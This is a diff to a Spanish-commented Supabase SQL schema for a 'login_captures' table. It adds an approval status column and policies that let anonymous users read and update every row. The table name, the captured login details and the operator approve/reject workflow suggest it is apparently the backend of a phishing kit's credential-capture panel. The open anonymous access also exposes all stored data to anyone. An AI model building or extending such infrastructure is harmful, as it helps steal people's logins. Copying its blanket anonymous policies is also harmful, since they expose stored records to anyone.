@@ -9,6 +9,7 @@ CREATE TABLE IF NOT EXISTS login_captures (
   captcha TEXT,
   user_agent TEXT,
   ip_address TEXT,
+  status TEXT DEFAULT 'pendiente',  -- pendiente, approved, rejected
   created_at TIMESTAMPTZ DEFAULT NOW()
 );
 
@@ -24,8 +25,26 @@ CREATE POLICY "Allow anonymous inserts" ON login_captures
   TO anon
   WITH CHECK (true);
 
--- (Opcional) Política para que solo usuarios autenticados puedan leer
-CREATE POLICY "Allow authenticated select" ON login_captures
+-- Política para que usuarios anónimos puedan hacer SELECT (necesario para el admin)
+CREATE POLICY "Allow anonymous select" ON login_captures
   FOR SELECT
-  TO authenticated
+  TO anon
   USING (true);
+
+-- Política para que usuarios anónimos puedan hacer UPDATE (necesario para aprobar/rechazar)
+CREATE POLICY "Allow anonymous update" ON login_captures
+  FOR UPDATE
+  TO anon
+  USING (true)
+  WITH CHECK (true);
+
+-- (Opcional) Política para que solo usuarios autenticados puedan leer
+-- CREATE POLICY "Allow authenticated select" ON login_captures
+--   FOR SELECT
+--   TO authenticated
+--   USING (true);
+
+-- ═══════════════════════════════════════════════════════════════
+-- Si ya creaste la tabla sin la columna 'status', ejecuta esto:
+-- ═══════════════════════════════════════════════════════════════
+-- ALTER TABLE login_captures ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'pendiente';
